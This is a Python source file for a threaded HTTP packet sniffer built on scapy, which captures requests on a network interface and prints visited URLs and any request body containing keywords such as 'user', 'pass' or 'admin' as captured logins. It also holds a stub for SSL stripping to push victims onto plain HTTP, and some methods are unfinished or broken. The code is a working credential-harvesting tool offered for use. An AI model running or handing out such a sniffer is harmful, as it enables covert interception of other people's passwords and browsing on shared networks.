# -*- coding: utf-8 -*-
# Sniffs HTTPRequest packages using scapy
# the script tries to filter out useless info and duplicates

import scapy.all as scapy
from scapy_http import http
from threading import Thread, Event
import argparse
import logging
import sys

class PacketSniffer(Thread):

    def  __init__(self, *args):
        super().__init__()
        self.print_name = 'HTTP sniffer'
        self.daemon = True
        self.login_text = ''
        self.old_url = ''
        self.socket = None
        self.interface = args[0]
        self.logger = args[1]
        self.classPrint("Initializing.", "[+]")
        self.stop_sniffing = Event()
        self.keywords = ['user','username','name','login','admin','pass','password']    #keywords for finding password/login

    def run(self):
        #Tell scapy to start sniffing packages on the supllied interface
        try:
            #create our own socket so we can close it after ;)
            self.socket = scapy.conf.L2listen(iface=self.interface)
            self.classPrint("Sniffing for HTTPRequests on " + str(self.interface) + ".", "[+]")
            scapy.sniff(opened_socket=self.socket, prn=self.processPacket, stop_filter=self.checkJoined)
        except Exception as e:
            print(e)

    def classPrint(self, text, icon):
        #Adds a class name to the printed messages.
        msg = "{} {}  -> \t{}".format(icon,self.print_name,text)
        self.logger.info(msg)

    def join(self, timeout=None):
        #for joining the thread / stopping the sniffing
        self.stop_sniffing.set()
        self.classPrint("Stopping.", "[-]")
        super().join(timeout)

    def checkJoined(self, packet):
        #check if thread is joined and sniffing should stop
        return self.stop_sniffing.isSet()

    def processPacket(self, packet):
        #Checks if package is an HTTPRequest and processes it if so.
        if (packet.haslayer(http.HTTPRequest)) :
            self.findUrl(packet)
            self.findKeywords(packet)
            self.findEmails(packet)

    def findKeywords(self, packet):
        #Finds login information by keywords.
        #It also checks if the text is not exactly the same as the last printed
        #text to filter out duplicates. (could be done better)

        if packet.haslayer(scapy.Raw):
            text = packet[scapy.Raw].load
            text = text.decode('utf-8')
            for keyword in self.keywords:
                if keyword in text:
                    if not text == self.login_text:
                        self.classPrint("LOGIN : " + text, "[!]")
                    self.login_text = text

    def findEmails(self, packet):
        #This function will check for email addresses by regex or something
        if packet.haslayer(scapy.Raw):
            text = str(packet[scapy.Raw].load)

    def sslStrip(self, packet):
        #redirect user to http variant of site when availlable
        self.logger.DEBUG(site)

    def findUrl(self, packet):
        #Takes the HTTPRequest packet and constructs a string containing the complete URL
        url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
        if not url == self.old_url:
            self.classPrint("URL: " + url.decode('utf-8'), "[*]")
        self.old_url = url
